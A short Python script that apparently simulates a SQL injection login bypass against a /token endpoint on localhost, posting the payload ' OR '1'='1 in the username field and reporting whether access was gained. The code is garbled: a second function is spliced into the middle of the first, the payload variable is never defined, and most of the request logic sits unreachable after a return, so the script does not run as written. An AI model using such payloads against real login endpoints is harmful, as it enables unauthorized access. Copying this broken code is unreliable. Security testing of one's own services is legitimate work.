import requests
import json

def simulate_sqli_attack() -> str:
    """Simulates a SQL injection attack on the /token endpoint."""
    url = "http://localhost:8000/token"
    headers = {'Content-Type': 'application/json'}

    # SQLi payload for the username field
    # This is a classic SQLi payload. It might not work if the application
    # is using parameterized queries (which it should be).
def get_sqli_payload():
    """
    Returns a classic SQL injection payload.
    """
    return "' OR '1'='1"


    payload = {"username": sqli_payload, "password": "dummy_password"}

    output = "Simulating SQL injection attack on /token endpoint...\n"
    output += f"Using payload: {json.dumps(payload)}\n"
    try:
        response = requests.post(url, headers=headers, data=json.dumps(payload))
        if response.status_code == 200:
            output += "[SUCCESS] SQLi attack successful. Logged in as a user.\n"
            output += f"Response: {response.text}\n"
        else:
            output += f"SQLi attack failed. Status: {response.status_code}\n"
            output += f"Response: {response.text}\n"
    except requests.exceptions.ConnectionError as e:
        output += f"Connection error: {e}\n"
    return output

if __name__ == '__main__':
    print(simulate_sqli_attack())
